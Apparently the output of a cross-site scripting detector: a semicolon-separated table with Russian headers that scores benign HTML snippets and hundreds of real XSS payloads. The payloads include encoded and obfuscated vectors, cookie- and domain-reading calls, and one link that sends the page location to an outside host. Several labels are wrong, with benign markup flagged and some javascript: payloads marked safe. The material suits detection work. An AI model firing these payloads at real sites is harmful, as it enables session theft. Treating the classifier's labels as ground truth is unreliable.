Входная строка;XSS;Вероятность;Риск
<input type='text' name='field'>;False;29.42%;LOW
<input type='text' name='field'>;False;29.42%;LOW
<a href='/page'>Contact</a>;False;1.05%;SAFE
<script>\u0061lert(1)</script>;True;65.71%;HIGH
"<form><button formaction=javascript&colon;alert(1)>CLICKME";True;87.42%;CRITICAL
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
<input type='text' name='field'>;False;29.42%;LOW
<h4>Login</h4>;False;27.98%;LOW
"a=â€Funâ€;b=â€ctionâ€;c=â€evâ€;d=â€al(aâ€;e=â€tobâ€;f=â€(â€˜YWxlcnQoMSk=â€™))â€;self[a+b](c+d+e+f)();";True;60.94%;HIGH
%22%3E%3C%69%6D%67%20%73%72%63%3D%78%20%6F%6E%65%72%72%6F%72%3D%70%72%6F%6D%70%74%28%64%6F%63%75%6D%65%6E%74%2E%64%6F%6D%61%69%6E%29%3B%3E;True;70.29%;HIGH
"<IMG SRC=# onmouseover=""alert('xxs')"">";True;99.75%;CRITICAL
<img/â€™onerror=alert(1) src=a>;True;99.50%;CRITICAL
<button>Read more</button>;False;28.28%;LOW
"%20""><img src=x onerror=prompt(document.domain);>";True;82.49%;CRITICAL
<button>Read more</button>;False;28.28%;LOW
<p>About</p>;False;34.33%;LOW
"""onclick=prompt(8)><svg/onload=prompt(8)>""@x.y";True;75.07%;HIGH
*/</script>'>alert(1)/*<script/1=';True;85.83%;CRITICAL
"%20""><img src=q onerror=alert(1)>";True;99.70%;CRITICAL
<input onauxclick=alert(1)>;True;99.60%;CRITICAL
{{_Vue.h.constructor`alert(1)`()}};True;83.62%;CRITICAL
"""><svg+onload=alert&amp;#x65""1";True;99.49%;CRITICAL
<h2>Login</h2>;False;27.98%;LOW
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
"""><img src=x onafterprint=prompt(document.domain);>";True;91.02%;CRITICAL
<a href='/page'>Contact</a>;False;1.05%;SAFE
<div>Home</div>;False;25.75%;LOW
<h4>Login</h4>;False;27.98%;LOW
<svg onload=eval(window.name)>;True;81.44%;CRITICAL
"')}, 1000);alert(""xss"");//";True;94.67%;CRITICAL
"-alert(1)-&apos;";True;86.82%;CRITICAL
<svg><script>123<1>alert(123)</script>;True;85.70%;CRITICAL
"\<a onmouseover=""alert(document.cookie)""\>xxs link\</a\>";True;99.23%;CRITICAL
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
<img src='image.jpg' alt='image'>;False;34.81%;LOW
<a href='/page'>Contact</a>;False;1.05%;SAFE
"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==";True;53.99%;MEDIUM
<h4>Login</h4>;False;27.98%;LOW
<p>About</p>;False;34.33%;LOW
<div>Home</div>;False;25.75%;LOW
<h4>Login</h4>;False;27.98%;LOW
<span class='class-524'>Services</span>;False;1.13%;SAFE
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
<button>Read more</button>;False;28.28%;LOW
â€œautofocus onclick=â€™alert();True;99.39%;CRITICAL
"""><svg+onload=alert&amp;#x04""1";True;99.49%;CRITICAL
"[""');alert('xss');//""]@xyz.xxx";True;93.01%;CRITICAL
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
"<IMG SRC=""jav ascript:alert('XSS');"">";True;99.38%;CRITICAL
<a href='/page'>Contact</a>;False;1.05%;SAFE
<button>Read more</button>;False;28.28%;LOW
"?utm_source=abc%60%3breturn+false%7d%29%3b%7d%29%3balert%60xss%60;%3c%2f%73%63%72%69%70%74%3e";True;66.23%;HIGH
<p>About</p>;False;34.33%;LOW
[[constructor.constructor('alert(document.cookie)')()]];True;88.88%;CRITICAL
<span class='class-1234'>Services</span>;False;1.13%;SAFE
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
{{constructor.constructor(alert`1`)()}};True;81.30%;CRITICAL
<script><script>alert(1)</script>;True;84.83%;CRITICAL
<div>Home</div>;False;25.75%;LOW
<script>function::[â€˜alertâ€™](1)</script>;True;85.87%;CRITICAL
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
"""><sVg%2fonload%3dalert%2ebind%28%29%281%29%20class%3dRahul-Dh>";True;41.09%;MEDIUM
<img src=x onerror=location=atob`amF2YXNjcmlwdDphbGVydChkb2N1bWVudC5kb21haW4p`>;True;93.17%;CRITICAL
<h4>Login</h4>;False;27.98%;LOW
--><svg onload=alert(1)>;True;99.64%;CRITICAL
<h4>Login</h4>;False;27.98%;LOW
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
<img src=x onerror=alert(document.domain)>;True;99.49%;CRITICAL
"<ScRipt>ALeRt(""hi"");</sCRipT>";True;94.20%;CRITICAL
</scr</script>ipt><ifr<iframeame/onload=prompt()>whs;True;92.12%;CRITICAL
<input type='text' name='field'>;False;29.42%;LOW
<p>About</p>;False;34.33%;LOW
"<imgonerror=&#x65;&#x76;&#x61;&#x6c;&#x28;&#x27;al&#x5c;u0065rt&#x28;1& #x29;&#x27;&#x29; src=a";True;75.09%;HIGH
<h4>Login</h4>;False;27.98%;LOW
<x v-bind:a='_b.constructor`alert(1)`()'>;True;61.52%;HIGH
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
<p>About</p>;False;34.33%;LOW
<scr<script>ipt>alert('XSS')</scr</script>ipt>;True;89.52%;CRITICAL
"""&lt;img src=1 onerror=alert(1)&gt;";True;99.73%;CRITICAL
"javascript:`//""//\""//</title></textarea></style></noscript></noembed></script></template>&lt;svg/onload='/*--><html */ onmouseover=alert()//'>`";True;99.11%;CRITICAL
<img src='image.jpg' alt='image'>;False;34.81%;LOW
<span class='class-794'>Services</span>;False;1.13%;SAFE
"javascript:var a=document.createElement('a');a.href='javascript:alert(1)';document.body.appendChild(a)";True;87.25%;CRITICAL
"&#x3C;script&#x3E;alert(1)&#x3C;&#x2F;script&#x3E;";True;90.86%;CRITICAL
<img src='image.jpg' alt='image'>;False;34.81%;LOW
<div>Home</div>;False;25.75%;LOW
"<img usemap=#x><map name=""x""><area href onfocus=alert(1) id=x>";True;99.84%;CRITICAL
"&lt;img/src/onerror=alert(`test`)&gt;";True;99.40%;CRITICAL
"""><svg+onload=alert&amp;#x84""1";True;99.49%;CRITICAL
<input type='text' name='field'>;False;29.42%;LOW
%3E%3Cbody%20onload=javascript:alert(1)%3E;True;98.39%;CRITICAL
"""><svg+onload=alert&amp;#x67""1";True;99.49%;CRITICAL
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
%uff3cscript%uff3ealert('XSS')%uff3c/script%uff3e;True;91.60%;CRITICAL
<img src='test' onmouseover='alert(2)'>;True;99.60%;CRITICAL
"%E5%98%8D%E5%98%8ASet-Cookie:whoami=thecyberneh%0d%0a%0d%0a%3Cscript%3Ealert(1);%3C/script%3E";True;77.32%;HIGH
<svg/on%20onload=alert(1)>;True;99.49%;CRITICAL
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
<span class='class-314'>Services</span>;False;1.13%;SAFE
<img src='image.jpg' alt='image'>;False;34.81%;LOW
<iframe src=# onmouseover=alert(String.fromCharCode(88,83,83))></iframe>;True;99.73%;CRITICAL
"""><svg+onload=alert&amp;#x91""1";True;99.49%;CRITICAL
"""\""><body/onload=&lt;!--&gt;&#10confirm(1);prompt(/XSS/.source)>"",";True;87.21%;CRITICAL
%C0%BCscript%C0%BEalert(1)%C0%BC/script%C0%BE;True;90.55%;CRITICAL
<p>About</p>;False;34.33%;LOW
<input type='text' name='field'>;False;29.42%;LOW
"javascript://'/</title></style></textarea></script>--><p"" onclick=alert()//>*/alert()/*";True;99.09%;CRITICAL
<button>Read more</button>;False;28.28%;LOW
"""autofocus onfocus='alert(document.domain)'";True;99.32%;CRITICAL
"<x:script xmlns:x=""http://www.w3.org/1999/xhtml"">alert(1);</x:script>";True;79.16%;HIGH
"<b/alt=""1""onmouseover=InputBox+1 language=vbs>test</b>";True;99.61%;CRITICAL
<div>Home</div>;False;25.75%;LOW
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
"""><img src=x onerror=prompt(document&#46;domain);>";True;82.49%;CRITICAL
<input type='text' name='field'>;False;29.42%;LOW
"*/alert(1)"">'onload=""/*<svg/1='";True;99.61%;CRITICAL
<input type='text' name='field'>;False;29.42%;LOW
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
url=%26%2302java%26%23115cript:alert(document.domain);True;80.98%;CRITICAL
"""&gt;&lt;img src=x onerror=prompt(document.domain);&gt;";True;85.97%;CRITICAL
<h4>Login</h4>;False;27.98%;LOW
<!--\x3E<img src=xxx:x onerror=javascript:alert(1)> -->;True;99.57%;CRITICAL
<p>About</p>;False;34.33%;LOW
%253Cscript%253Ealert('XSS')%253C/script%253E;True;91.60%;CRITICAL
<input type='text' name='field'>;False;29.42%;LOW
"javascript://'/</title></style></textarea></script>--><p"" %0D %0A onclick=alert(123)//>*/alert()/*<img src=x onerror=alert(456)/><svg/onload=prompt(789)/>;'""// :;fn();%0a%0d\n\r\t{{12*12+'Audi RS5'.substr(0,4)}}XXX<script>alert('XSS')";True;94.61%;CRITICAL
"""><script>alert(123)</script>";True;92.27%;CRITICAL
<script>alert(1)</script>.htm;True;85.30%;CRITICAL
"'>'\n><script>alert(2);</script>";True;94.18%;CRITICAL
"<IMG SRC='vbscript:msgbox(""XSS"")'>";True;96.61%;CRITICAL
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
">'>""><svg/onload=alert(document.domain)>";True;98.45%;CRITICAL
"â€&amp;gt;&amp;lt;svg onload=alert&amp;amp;#0000000040""1"")&amp;gt;";True;99.34%;CRITICAL
<img src='image.jpg' alt='image'>;False;34.81%;LOW
<svg><animate onrepeat=alert(1) attributeName=x dur=1s repeatCount=2 />;True;99.81%;CRITICAL
<audio controls onprogress=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>;True;99.71%;CRITICAL
<button>Read more</button>;False;28.28%;LOW
<span class='class-254'>Services</span>;False;1.13%;SAFE
<button>Read more</button>;False;28.28%;LOW
"en-us/Search#/?search=""><img src=x onerror=prompt(document.domain);>";True;89.60%;CRITICAL
"<iframe src=""data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E""></iframe>";True;60.52%;HIGH
<img src/onerror=prompt(8)>;True;84.02%;CRITICAL
<a href='/page'>Contact</a>;False;1.05%;SAFE
<p>About</p>;False;34.33%;LOW
"&rdquo;&gt;&lt;svg onload=alert&amp;#000000040&quot;1&quot;&gt;";True;99.19%;CRITICAL
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
<span class='class-104'>Services</span>;False;1.13%;SAFE
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
<p>About</p>;False;34.33%;LOW
"""><img src=x onerror=eval('prompt(document.domain)')>";True;80.54%;CRITICAL
<p>About</p>;False;34.33%;LOW
<h6>Login</h6>;False;27.98%;LOW
"""><svg+onload=alert&amp;#x6E""1";True;99.49%;CRITICAL
<marquee+loop=1+width=0+onfinish='new+Function`al\ert\`1\``'>;True;98.87%;CRITICAL
"'`""><*chr*script>log(*num*)</script>";True;43.77%;MEDIUM
<p>About</p>;False;34.33%;LOW
<button>Read more</button>;False;28.28%;LOW
"<?tag x=""-->"" test=""<img src=x onerror=alert(1)//"">";True;98.92%;CRITICAL
<button>Read more</button>;False;28.28%;LOW
"<a onpaste=""alert(1)"" contenteditable>test</a>";True;99.84%;CRITICAL
";</script><embed/test='asdf'/sr%00c='/'>";True;55.97%;MEDIUM
<input type='text' name='field'>;False;29.42%;LOW
<button>Read more</button>;False;28.28%;LOW
<p>About</p>;False;34.33%;LOW
<button>Read more</button>;False;28.28%;LOW
%0d%0a%20<script>prompt(document.domain)</script>;True;61.33%;HIGH
<Img Src=OnXSS OnError=confirm(document.cookie)>;True;83.60%;CRITICAL
<img src=x onerror=alert(123) />;True;99.54%;CRITICAL
<p>About</p>;False;34.33%;LOW
"""><svg+onload=alert&amp;#x59""1";True;99.49%;CRITICAL
<h4>Login</h4>;False;27.98%;LOW
<div>Home</div>;False;25.75%;LOW
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
"""><svg+onload=alert&amp;#x19""1";True;99.49%;CRITICAL
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
"<svg/onloadâ€‹=alert/&#42;&#42;/(4)>";True;65.62%;HIGH
<h6>Login</h6>;False;27.98%;LOW
JavaSCript:alert(123);True;95.57%;CRITICAL
<input type='text' name='field'>;False;29.42%;LOW
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
<img src='image.jpg' alt='image'>;False;34.81%;LOW
<span class='class-434'>Services</span>;False;1.13%;SAFE
<div>Home</div>;False;25.75%;LOW
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
"data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=";True;54.11%;MEDIUM
<h2>Login</h2>;False;27.98%;LOW
"""><svg+onload=alert&amp;#x48""1";True;99.49%;CRITICAL
<h2>Login</h2>;False;27.98%;LOW
<component is=script text=alert(1)>;True;80.50%;CRITICAL
<script>alert(â€œxssâ€)</script>;True;83.41%;CRITICAL
"""><svg+onload=alert&amp;#x54""1";True;99.49%;CRITICAL
<input type='text' name='field'>;False;29.42%;LOW
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
<div>Home</div>;False;25.75%;LOW
<script>throw onerror=Uncaught=eval,e=new Error,e.message='/*'+location.hash,!!window.InstallTrigger?e:e.message</script>;True;98.58%;CRITICAL
<div>Home</div>;False;25.75%;LOW
%26%2302java%26%23115cript:alert(document.domain);True;81.60%;CRITICAL
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
"""><img src='x' onerror='prompt(document.domain);'>";True;79.06%;HIGH
"</script><img/*%00/src=""worksinchrome&colon;prompt(1)""/%00*/onerror='eval(src)'>";True;95.30%;CRITICAL
%3F%20<img src=1 onerror=alert(1)>;True;99.78%;CRITICAL
<span class='class-974'>Services</span>;False;1.13%;SAFE
><sVg%2Fonload%3Dalert%281%29+class%3Dikhsan>;True;45.76%;MEDIUM
<p :=_c.constructor`alert(1)`()>;True;58.23%;MEDIUM
<a href='/page'>Contact</a>;False;1.05%;SAFE
<bgsound onpropertychange=alert(1)>;True;99.62%;CRITICAL
"<DIV STYLE=""background-image: url(javascript:alert('XSS'))"">";True;82.84%;CRITICAL
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
<img src='image.jpg' alt='image'>;False;34.81%;LOW
eyJ0eXBlIjoibnVsbCIsImh0bWwiOiI8c2NyaXB0PmFsZXJ0KCdYU1MgUE9DIGJ5IERFREknKTwvc2NyaXB0PiJ9;True;36.77%;LOW
"<iframe src=j&#x61;vasc&#x72ipt&#x3a;alert&#x28;1&#x29;>";True;67.98%;HIGH
<a href='/page'>Contact</a>;False;1.05%;SAFE
<button>Read more</button>;False;28.28%;LOW
"""><svg+onload=alert&amp;#x4B""1";True;99.49%;CRITICAL
"""><svg+onload=alert&amp;#x76""1";True;99.49%;CRITICAL
"</a onmousemove=""alert(1)"">";True;99.08%;CRITICAL
"<iframe src=""javascript:alert('XSS')""></iframe>";True;94.73%;CRITICAL
%uff3c%uff73%uff63%uff72%uff69%uff70%uff74%uff3ealert('XSS')%uff3c%uff2f%uff73%uff63%uff72%uff69%uff70%uff74%uff3e;True;78.18%;HIGH
"""><img src=x onerror=prompt(document['domain']);>.html";True;80.36%;CRITICAL
"&#x27;&quot;&gt;&lt;img src=x onerror=prompt(document['domain']);&gt;&#x27;";True;88.92%;CRITICAL
<div>Home</div>;False;25.75%;LOW
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
<a href='/page'>Contact</a>;False;1.05%;SAFE
<script>\u{61}lert(1)</script>;True;53.91%;MEDIUM
%3Csvg%20onload%3D%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B%28%26%231%3B%29%3E;True;76.17%;HIGH
<a href='/page'>Contact</a>;False;1.05%;SAFE
<input type='text' name='field'>;False;29.42%;LOW
<applet id=x tabindex=1 onfocus=alert(1)></applet>;True;99.86%;CRITICAL
<input type='text' name='field'>;False;29.42%;LOW
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
<span class='class-1014'>Services</span>;False;1.13%;SAFE
<button>Read more</button>;False;28.28%;LOW
<span class='class-864'>Services</span>;False;1.13%;SAFE
<h2>Login</h2>;False;27.98%;LOW
<a href='/page'>Contact</a>;False;1.05%;SAFE
"<base+href=""javascript:alert(1);//"">";True;85.47%;CRITICAL
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
<svg/onload=parent[/al/.source.concat(/ert/.source)] (2)>;True;99.10%;CRITICAL
"""><svg/onload=prompt('Supakiad-S. (m3ez)', document.domain)â€‹>";True;87.70%;CRITICAL
"<IMG SRC=`javascript:alert(""RSnake says, 'XSS'"")`>";True;98.30%;CRITICAL
<div>Home</div>;False;25.75%;LOW
<p>About</p>;False;34.33%;LOW
<a href='/page'>Contact</a>;False;1.05%;SAFE
-top['al\x65rt']('xss')-;True;58.66%;MEDIUM
\x3Cscript>javascript:alert(1)</script>;True;79.69%;HIGH
<h4>Login</h4>;False;27.98%;LOW
"""><svg+onload=alert&amp;#x51""1";True;99.49%;CRITICAL
"&amp;lt;img/src/onerror=alert(`test`)&amp;gt;";True;99.37%;CRITICAL
"""><img src=x id=""img""> <script>document.getElementById('img').addEventListener('error', function(){prompt(document.domain);})</script>";True;37.57%;LOW
}}}</script><script>alert(1)</script>;True;84.83%;CRITICAL
"""><a/\test=""%26quot;x%26quot;""href='%01javascript:/*%b1*/;location.assign(""//hackerone.com/stealthy?x=""+location)'>Click -@stealthybugs";True;41.34%;MEDIUM
<a href='/page'>Contact</a>;False;1.05%;SAFE
autofocus ' onfocus='alert(document.domain)';True;99.61%;CRITICAL
<img src='image.jpg' alt='image'>;False;34.81%;LOW
<a href='/page'>Contact</a>;False;1.05%;SAFE
"%22%3E%3Cimg/src=x/onerro=6%3E%3Cimg/src=%221%22/onerror=alert(1);%3E1";True;99.09%;CRITICAL
<input type='text' name='field'>;False;29.42%;LOW
</option><img src=x onerror=alert(origin)>;True;99.67%;CRITICAL
<img src='image.jpg' alt='image'>;False;34.81%;LOW
<input type='text' name='field'>;False;29.42%;LOW
alert?.(document?.cookie);True;91.48%;CRITICAL
<image src/onerror=prompt(8)>;True;83.87%;CRITICAL
"""><svg+onload=alert&amp;#x1A""1";True;99.49%;CRITICAL
<p>About</p>;False;34.33%;LOW
<button>Read more</button>;False;28.28%;LOW
"""><svg+onload=alert&amp;#x2C""1";True;99.49%;CRITICAL
"<script>eval(â€˜alâ€™+â€™ert(1)â€™);</script>";True;81.11%;CRITICAL
new Function`a\l\ert\`1\``;False;8.84%;SAFE
<p>About</p>;False;34.33%;LOW
<dialog open onclose=alert(1)><form method=dialog><button>XSS</button></form>;True;99.86%;CRITICAL
<button>Read more</button>;False;28.28%;LOW
<img src='image.jpg' alt='image'>;False;34.81%;LOW
<div>Home</div>;False;25.75%;LOW
<a href='/page'>Contact</a>;False;1.05%;SAFE
<span class='class-564'>Services</span>;False;1.13%;SAFE
javascript:/*'-alert(1)-'*/;True;96.90%;CRITICAL
"&#39;-alert(1)-&#39;";True;88.57%;CRITICAL
<div>Home</div>;False;25.75%;LOW
""" onfocus=""alert(1)"" autofocus=""";True;99.28%;CRITICAL
"&quot;&gt;&lt;svg onload=alert&amp;amp;#x00000040&quot;1&quot;&gt;";True;99.18%;CRITICAL
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
<img onerror=a&#108ert(1) src=a>;True;84.39%;CRITICAL
"""><img/src=x/onerro=6><img/src=""1""/onerror=import(location.search.split(""aa="").pop());>";True;64.94%;HIGH
"<a href=""javascript:alert(1)"">a</a>";False;20.74%;LOW
"""><svg+onload=alert&amp;#x94""1";True;99.49%;CRITICAL
<p>About</p>;False;34.33%;LOW
<script>+-+-1-+-+confirm(1)</script>;True;49.52%;MEDIUM
<h6>Login</h6>;False;27.98%;LOW
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
<img src='image.jpg' alt='image'>;False;34.81%;LOW
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
"<img/src/onerror=""this.ownerDocument.defaultView['\u0061lert'](4)"">";True;98.29%;CRITICAL
<p>About</p>;False;34.33%;LOW
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=javascript:alert(1)>xss</a>;False;4.80%;SAFE
<input type='text' name='field'>;False;29.42%;LOW
<span class='class-634'>Services</span>;False;1.13%;SAFE
<isindex formaction=javascript:alert(1) type=submit value=click>;True;85.84%;CRITICAL
"/*\""<sVg/oNloAd=alert(document.domain)//>\x3e";True;97.81%;CRITICAL
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
<button>Read more</button>;False;28.28%;LOW
0xd3adc0de<ScRiPt>alert('XSS Success!')</sCripT>;True;85.35%;CRITICAL
<p>About</p>;False;34.33%;LOW
"ABC<div style=""x:expression\x5C(javascript:alert(1)"">DEF";True;80.64%;CRITICAL
"' onerror='alert(""xss"")'>";True;99.49%;CRITICAL
"<p v-show=""_c.constructor`alert(1)`()"">";True;57.71%;MEDIUM
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
<h4>Login</h4>;False;27.98%;LOW
"""><form onformdata%3Dwindow.confirm(cookie)><button>XSS here<!--";True;46.92%;MEDIUM
<h4>Login</h4>;False;27.98%;LOW
<span class='class-1144'>Services</span>;False;1.13%;SAFE
"><s""%2b""cript>alert(document.cookie)</s""%2B""cript>";True;80.90%;CRITICAL
<input type='text' name='field'>;False;29.42%;LOW
<div>Home</div>;False;25.75%;LOW
"<bleh/onclick=top[/al/.source+/ert/.source]&Tab;``>click Pinaki @0xInfection";True;98.41%;CRITICAL
"<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>";True;95.25%;CRITICAL
<span class='class-404'>Services</span>;False;1.13%;SAFE
<a href='/page'>Contact</a>;False;1.05%;SAFE
%BCscript%BEalert(%A21%A2)%BC/script%BE;True;91.00%;CRITICAL
"<audio autoplay onloadedmetadata=alert(1)> <source src=""validaudio.wav"" type=""audio/wav""></audio>";True;99.80%;CRITICAL
"""><img src=x onerror=prompt(document.domain); title=x>";True;82.49%;CRITICAL
"<bgsound+src=""javascript:alert(1);"">";True;87.73%;CRITICAL
<p>About</p>;False;34.33%;LOW
javascript:74163166147401571561541571411447514115414516216450615176;True;79.86%;HIGH
"""><svg+onload=alert&amp;#x38""1";True;99.49%;CRITICAL
"&quot;&gt;&lt;img src=x onerror=prompt(document.domain);&gt;";True;87.11%;CRITICAL
<div>Home</div>;False;25.75%;LOW
<p>About</p>;False;34.33%;LOW
test@gmail.com%2527%5C%2522%253E%253Csvg%2Fonload%3Dalert%28%2Fxss%2F%29%253E;True;72.42%;HIGH
<img src='image.jpg' alt='image'>;False;34.81%;LOW
">'><script>alert(2);</script>";True;94.08%;CRITICAL
%0d%0a%20<img/src/onerror=alert(test`)>;True;99.15%;CRITICAL
oninput=â€alert(â€˜XSSâ€™);True;99.39%;CRITICAL
"&lt;script&gt;alert(1)&lt;/script&gt;";True;93.72%;CRITICAL
<input type='text' name='field'>;False;29.42%;LOW
"<img dynsrc=""javascript:alert('Successful XSS')"">";True;91.54%;CRITICAL
<img src='image.jpg' alt='image'>;False;34.81%;LOW
"echo('IPT>alert(""XSS"")</SCRIPT>'); ?>";True;93.51%;CRITICAL
<video onloadstart=alert()><source></*>;True;99.79%;CRITICAL
<span class='class-1314'>Services</span>;False;1.13%;SAFE
"""><svg+onload=alert&amp;#x81""1";True;99.49%;CRITICAL
"""><svg+onload=alert&amp;#x2A""1";True;99.49%;CRITICAL
"<svg/onloadâ€‹=alert&sol;**&sol;(3)>";True;60.80%;HIGH
"{{toString.constructor.prototype.toString=toString.constructor.prototype.call;[""a"",""alert(1)""].sort(toString.constructor);}}";True;98.67%;CRITICAL
"<DIV STYLE=""background-image: url(javascript:alert('XSS'))"">";True;82.84%;CRITICAL
<input type='text' name='field'>;False;29.42%;LOW
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
<button>Read more</button>;False;28.28%;LOW
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
<><img src=1 onerror=alert(1)>;True;99.76%;CRITICAL
'alert(1)'.replace(/.+/,eval);True;89.32%;CRITICAL
"<style>@keyframes slidein {}</style><xss style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></xss>";True;99.56%;CRITICAL
<input type='text' name='field'>;False;29.42%;LOW
"%0D%0A%0D%0A%3Cscript%3E%0D%0A%20alert(1);%0D%0A%3C/script%3E%0D%0A";True;90.52%;CRITICAL
<x onauxclick=a=alert,a(domain)>click -@niksthehacker;True;99.16%;CRITICAL
<body onbeforeprint=console.log(1)>;True;78.71%;HIGH
"&fileName=')},1000);alert(""XSS`);//";True;88.29%;CRITICAL
"""><svg+onload=alert&amp;#x9A""1";True;99.49%;CRITICAL
%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e;True;76.17%;HIGH
"<svg></p><style><g title=""</style><img src onerror=alert(document.domain)>"">";True;99.49%;CRITICAL
"&#62;'&gt;""<script>alert(2);</script>";True;93.21%;CRITICAL
%3csvg/onload=window%5b%22al%22+%22ert%22%5d1337`%3e;True;99.25%;CRITICAL
<a href='/page'>Contact</a>;False;1.05%;SAFE
<a href='/page'>Contact</a>;False;1.05%;SAFE
"""><svg+onload=alert&amp;#x29""1";True;99.49%;CRITICAL
<div>Home</div>;False;25.75%;LOW
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
<img src='image.jpg' alt='image'>;False;34.81%;LOW
%3cscript%3ealert(1)%3c/script%3e;True;92.34%;CRITICAL
{text:<img/src=x onload=confirm(1)>};True;79.99%;HIGH
"""><svg+onload=alert&amp;#x5A""1";True;99.49%;CRITICAL
<h6>Login</h6>;False;27.98%;LOW
<h2>Login</h2>;False;27.98%;LOW
<h2>Login</h2>;False;27.98%;LOW
<input type='text' name='field'>;False;29.42%;LOW
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
"""><img src=x onerror=(prompt(document.domain));>";True;80.20%;CRITICAL
<img src='image.jpg' alt='image'>;False;34.81%;LOW
<p>About</p>;False;34.33%;LOW
"<IMG SRC=""jav&#x0D;ascript:alert('XSS');"">";True;99.14%;CRITICAL
<!</textarea <body onload='alert(1)'>;True;99.91%;CRITICAL
"""onx+%00+onpointerenter%3dalert(domain)+x"" (working)- @Brutelogic";True;69.38%;HIGH
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
<span class='class-834'>Services</span>;False;1.13%;SAFE
"{{{}."")));alert(1)//""}}";True;94.03%;CRITICAL
<span class='class-464'>Services</span>;False;1.13%;SAFE
<input type='text' name='field'>;False;29.42%;LOW
"'>&lt;/b&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;b&gt;&lt;!--";True;84.78%;CRITICAL
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
<button>Read more</button>;False;28.28%;LOW
<span class='class-774'>Services</span>;False;1.13%;SAFE
<p>About</p>;False;34.33%;LOW
<div>Home</div>;False;25.75%;LOW
"<a""/onclick=(confirm)()>elcezeri!";True;70.19%;HIGH
